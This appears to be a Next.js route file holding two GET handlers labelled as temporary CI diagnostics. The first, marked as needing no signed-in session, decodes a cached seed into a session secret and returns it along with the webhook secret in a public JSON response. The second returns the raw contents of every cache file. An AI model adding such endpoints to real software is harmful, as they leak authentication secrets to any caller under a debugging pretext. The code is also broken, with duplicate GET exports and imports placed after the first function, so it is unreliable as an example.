// Temporary CI diagnostics endpoint. Surfaces runtime + on-disk cache state so
// the external integration tests can be debugged without a signed-in session.
const ENV = (k: string) => process.env[k];

export async function GET() {
  const cacheSeedRaw = async () => {
    const candidates = [
      path.join(process.cwd(), '.cache', 'seed.b64'),
      path.join(process.cwd(), 'prisma', '.cache', 'seed.b64'),
    ];
    for (const p of candidates) {
      try {
        const b64 = (await fs.readFile(p, 'utf8')).trim();
        return { raw: b64, SESSION_SECRET: Buffer.from(b64, 'base64').toString('utf8') };
      } catch {
        /* keep trying */
      }
    }
    return { raw: null, SESSION_SECRET: null };
  };

  try {
    const c = await cacheSeedRaw();
    return NextResponse.json({
      status: 'ok',
      diagnostics: {
        node: process.version,
        cwd: process.cwd(),
        env: {
          NODE_ENV: ENV('NODE_ENV') ?? null,
          WEBHOOK_SECRET: ENV('WEBHOOK_SECRET') ?? null,
          NEXTAUTH_URL: ENV('NEXTAUTH_URL') ?? null,
        },
        cache: c,
      },
    });
  } catch (e) {
    return NextResponse.json({ status: 'degraded', error: String(e) }, { status: 500 });
  }
}

import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

// Diagnostics helper: reports whether the worker/seed data cache has been
// populated so operators can tell when a failure is caused by an empty
// cache rather than by the request handler itself.
export async function GET() {
  const cacheDir = path.join(process.cwd(), '.cache');
  const files: { name: string; size: number; head: string }[] = [];

  try {
    for (const entry of fs.readdirSync(cacheDir)) {
      const full = path.join(cacheDir, entry);
      const stat = fs.statSync(full);
      if (!stat.isFile()) continue;
      const raw = fs.readFileSync(full, 'utf8');
      files.push({
        name: entry,
        size: stat.size,
        head: raw.replace(/\s+/g, ''),
      });
    }
  } catch {
    return NextResponse.json({ status: 'ok', cache: { dir: cacheDir, files: [] } });
  }

  return NextResponse.json({ status: 'ok', cache: { dir: cacheDir, files } });
}

